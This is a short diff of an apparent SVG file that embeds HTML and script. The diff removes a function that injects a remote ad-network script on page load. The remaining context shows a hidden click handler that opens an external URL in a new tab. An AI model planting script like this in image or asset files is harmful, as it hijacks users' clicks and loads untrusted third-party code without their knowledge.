@@ -118,12 +118,5 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
       window.open(URL_, '_blank', 'noopener');
       count('smart:open');
     }, true);
-    function add() {
-      var s = document.createElement('script');
-      s.async = true;
-      s.src = 'https://pl29187115.profitablecpmratenetwork.com/d2/bc/ce/d2bccefe4c967fbff9ec64b472024047.js';
-      document.body.appendChild(s);
-    }
-    if (document.body) add(); else document.addEventListener('DOMContentLoaded', add);
   })();
 ]]></script></body></html></foreignObject></svg>
